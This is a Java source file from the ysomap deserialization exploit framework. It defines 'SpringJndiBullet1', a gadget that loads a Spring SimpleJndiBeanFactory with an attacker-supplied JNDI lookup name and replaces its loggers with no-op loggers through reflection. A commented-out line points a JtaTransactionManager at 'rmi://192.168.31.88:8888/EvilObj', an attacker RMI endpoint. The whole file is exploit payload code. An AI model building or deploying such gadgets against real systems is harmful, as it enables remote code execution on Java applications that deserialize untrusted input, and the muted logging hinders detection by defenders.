package ysomap.core.bullet.spring;

import org.apache.commons.logging.impl.NoOpLog;
import org.springframework.jndi.support.SimpleJndiBeanFactory;
import ysomap.common.annotation.Bullets;
import ysomap.common.annotation.NotNull;
import ysomap.common.annotation.Require;
import ysomap.core.bean.Bullet;
import ysomap.core.util.ReflectionHelper;

/**
 * @author wh1t3P1g
 * @since 2020/6/6
 */
@Bullets
public class SpringJndiBullet1 extends Bullet<Object> {

    @NotNull
    @Require(name = "jndi", detail = "")
    public String jndi;

    @Override
    public Object getObject() throws Exception {
        SimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();
        bf.setShareableResources(jndi);
        ReflectionHelper.setFieldValue(bf, "logger", new NoOpLog());
        ReflectionHelper.setFieldValue(bf.getJndiTemplate(), "logger", new NoOpLog());
//        JtaTransactionManager manager = new JtaTransactionManager();
//        manager.setUserTransactionName("rmi://192.168.31.88:8888/EvilObj");
        return bf;
    }
}
